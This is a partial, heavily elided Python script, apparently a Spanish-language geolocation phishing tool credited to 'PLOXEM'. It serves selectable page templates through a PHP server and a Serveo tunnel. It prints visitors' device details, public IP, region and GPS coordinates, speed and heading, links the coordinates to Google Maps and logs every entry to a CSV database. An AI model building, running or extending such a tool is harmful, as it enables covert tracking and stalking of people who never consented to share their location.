...
print(G + '[+]' + C + ' Comprobando Dependencias...' + W)
...
|__|      |______|  \______/  /    /  \    \  |_______| |__|    |__| 
	...
	r'''
	                  Script Geolocalización 
	                                                       ''' + W) 
	print('\n' + G + '[>]' + C + ' Creado por : ' + W + 'PLOXEM')
	print(G + '[>]' + C + ' Versión    : ' + W + version + '\n')

def ver_check():
	print(G + '[+]' + C + ' Comprobando actualizaciones.....', end='')
	...
	try:
		...
		if ver_sc == 200:
			...
			if version == github_ver:
				print(C + '[' + G + ' Actualizado ' + C +']' + '\n')
			else:
				print(C + '[' + G + ' Disponible : {} '.format(github_ver) + C + ']' + '\n')
		else:
			print(C + '[' + R + ' Estado : {} '.format(ver_sc) + C + ']' + '\n')
	except Exception as e:
		print('\n' + R + '[-]' + C + ' Excepción : ' + W + str(e))

def tunnel_select():
	if tunnel_mode == None:
		serveo()
	elif tunnel_mode == 'manual':
		print(G + '[+]' + C + ' Omitiendo Serveo, inicie su propio servicio de túnel manualmente...' + W + '\n')
	else:
		print(R + '[+]' + C + ' Modo de túnel seleccionado no válido, consulte la ayuda [-h, --help]' + W + '\n')
		exit()

def template_select():
	global site, info, result
	print(G + '[+]' + C + ' Seleccione una plantilla : ' + W + '\n')
	...
	print('\n' + G + '[+]' + C + ' Cargando {} Plantilla...'.format(templ_json['templates'][selected]['name']) + W)
...
def server():
	print('\n' + G + '[+]' + C + ' Puerto : '+ W + str(port))
	print('\n' + G + '[+]' + C + ' Iniciando Servidor PHP......' + W, end='')
	...
	try:
		...
		with open (info, 'r') as file2:
			...
			for value in json3['dev']:
				...
				print(G + '[+]' + C + ' Información del Dispositivo : ' + W + '\n')
				print(G + '[+]' + C + ' OS         : ' + W + var_os)
				print(G + '[+]' + C + ' Plataforma : ' + W + var_platform)
				print(G + '[+]' + C + ' CPU Cores  : ' + W + var_cores)
				print(G + '[+]' + C + ' RAM        : ' + W + var_ram)
				print(G + '[+]' + C + ' GPU Vendor : ' + W + var_vendor)
				print(G + '[+]' + C + ' GPU        : ' + W + var_render)
				print(G + '[+]' + C + ' Resolución : ' + W + var_res)
				print(G + '[+]' + C + ' Navegador  : ' + W + var_browser)
				print(G + '[+]' + C + ' IP Pública : ' + W + var_ip)
				...
				if sc == 200:
					...
					print(G + '[+]' + C + ' Continente : ' + W + var_continent)
					print(G + '[+]' + C + ' País       : ' + W + var_country)
					print(G + '[+]' + C + ' Región     : ' + W + var_region)
					print(G + '[+]' + C + ' Ciudad     : ' + W + var_city)
	...
	try:
		with open (result, 'r') as file:
			...
			for value in json2['info']:
				...
				print (G + '[+]' + C + ' Latitud   : ' + W + var_lat)
				print (G + '[+]' + C + ' Longitud  : ' + W + var_lon)
				print (G + '[+]' + C + ' Exactitud : ' + W + var_acc)
				print (G + '[+]' + C + ' Altitud   : ' + W + var_alt)
				print (G + '[+]' + C + ' Dirección : ' + W + var_dir)
				print (G + '[+]' + C + ' Velocidad : ' + W + var_spd)
	except ValueError:
		error = file
		print ('\n' + R + '[-] ' + W + error)
		repeat()

	print ('\n' + G + '[+]' + C + ' Ver en Google Maps..........: ' + W + 'https://www.google.com/maps/place/' + var_lat.strip(' deg') + '+' + var_lon.strip(' deg'))
...
def csvout():
	...
	with open('db/results.csv', 'a') as csvfile:
		...
		writer.writerow(row)
	print(G + '[+]' + C + ' Nueva Entrada agregada en la Base de Datos.: ' + W + os.getcwd() + '/db/results.csv')
